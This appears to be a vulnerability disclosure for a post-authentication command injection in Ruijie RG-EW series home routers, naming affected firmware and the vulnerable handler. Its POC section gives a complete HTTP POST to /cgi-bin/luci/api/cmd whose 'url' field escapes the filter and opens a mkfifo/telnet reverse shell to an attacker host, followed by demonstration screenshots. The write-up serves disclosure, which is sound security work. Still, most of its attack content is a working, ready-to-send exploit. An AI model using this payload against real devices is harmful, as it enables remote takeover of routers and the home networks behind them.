## Regarding the Post-Authorization RCE in Ruijie Home Router EW Series Devices
Reported by:Sheep
### Affected Versions:

- RG-EW5100BE PRO latest version EW_3.0B11P280_EW5100BE-PRO_12183019
- Theoretically applies to all EW series devices

Download link: https://www.ruijie.com.cn/fw/rj-cp-ew5100bepro/

# Overview

**In the Ruijie RG-EW series routers, there exists an authorization-based command injection vulnerability by sending a POST request containing a specific URL field to /cgi-bin/luci/api/cmd.**

# Vulnerability details

**Under /usr/sbin/unifyframe-sgi.elf**

![image-20250921000358833](https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509222146491.png)

**For the url field in the data field, only** `$(` **and** `<` **were filtered, yet command execution still occurred afterwards.**

![image-20250921000536168](https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509222146493.png)

# POC

Send the following POST request to `/cgi-bin/luci/api/cmd`.

```url
POST /cgi-bin/luci/api/cmd?auth=24fde8726283b2b2e656f2f438751d13 HTTP/1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6,zh-HK;q=0.5
Cookie: SN=a55fa66d7c919385ee10997fadb8c379; __APP_LANG__=zh_cn

{
    "method": "devSta.get",
    "params": {
        "module": "123",
        "from_url": 1,
        "data" : {"kkk":"abcd","url": "192.168.121.160\" -o /dev/null; mkfifo /tmp/test;telnet 192.168.121.138 6666 0</tmp/test|/bin/sh > /tmp/test ; echo \""}
              }
}
```

# Attack Demonstration

![image-20250922214553006](https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509222146494.png)


![image-20250922214609353](https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509222146495.png)
